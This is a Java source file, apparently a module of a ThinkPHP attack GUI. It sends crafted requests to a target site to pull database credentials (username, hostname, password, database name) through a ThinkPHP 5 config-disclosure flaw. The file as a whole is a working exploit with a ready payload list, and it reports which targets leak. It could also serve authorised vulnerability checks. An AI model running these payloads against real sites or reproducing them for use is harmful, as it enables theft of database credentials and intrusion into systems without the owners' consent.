package exploit;

import com.example.thinkphpgui.ConfigManager;
import com.example.thinkphpgui.Exploit;
import com.example.thinkphpgui.utils.HttpRequestUtil;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Tp5_DB_Leak implements Exploit {
    private final ConfigManager configManager = ConfigManager.getInstance();

    private final List<String> payloadList = new ArrayList<>(Arrays.asList("/think\\config/get&name=database.username", "/think\\config/get&name=database.hostname", "/think\\config/get&name=database.password", "/think\\config/get&name=database.database"));


    public void verify(String url) {
        Boolean isVulnerable=false;
        for (String module : ConfigManager.moduleList) {
            for (String payload : payloadList) {
                try {
                    HttpURLConnection httpURLConnection = HttpRequestUtil.get(url + "?s=" + module + payload);
                    //httpURLConnection.getResponseCode()==200&&
                    if (httpURLConnection.getContentLength() >= 2 && httpURLConnection.getContentLength() <= 20) {
                        System.out.println(httpURLConnection.getContentLength());
                        configManager.appendToTextArea("[+] " + url + "   存在TP5 数据库信息泄露 " + url + "?s=" + module + payload);
                        isVulnerable=true;
                    }

                } catch (Exception e) {
                     e.printStackTrace();
                }
            }
        }
        if(!isVulnerable){
            configManager.appendToTextArea("[-] " + url + " 不存在TP5 数据库信息泄露");
        }

    }


    @Override
    public void startScan(String url) throws IOException {
        verify(url);
    }


}
